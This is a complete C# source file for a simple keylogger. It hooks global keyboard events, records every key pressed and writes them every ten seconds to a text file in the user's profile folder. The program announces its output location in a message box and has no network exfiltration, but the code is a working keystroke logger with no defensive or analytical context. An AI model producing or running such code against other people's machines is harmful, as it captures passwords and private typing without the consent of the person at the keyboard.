using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using System.IO;
namespace cyberphobia_s_kl
{
    internal class Program
    {
        static string total_String = "";
        static pauser p = new pauser();
        static void Main(string[] args)
        {
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\keys\");
            Gma.System.MouseKeyHook.IKeyboardEvents c = Gma.System.MouseKeyHook.Hook.GlobalEvents();
            c.KeyDown += C_KeyDown;
            
            Timer t = new Timer();
            t.Tick += T_Tick;
            t.Interval = 10000;
            t.Start();
            MessageBox.Show(@"The output location is " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\keys\keys_pressed.txt", @"Output Location");
            
            p.ShowDialog();
        }

        private static void T_Tick(object sender, EventArgs e)
        {
            write();
        }

        private static void C_KeyDown(object sender, KeyEventArgs e)
        {

            total_String += "\n" + e.KeyCode;
            
            

        }
        static void write()
        {
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\keys\keys_pressed.txt", total_String);

        }
    }
}
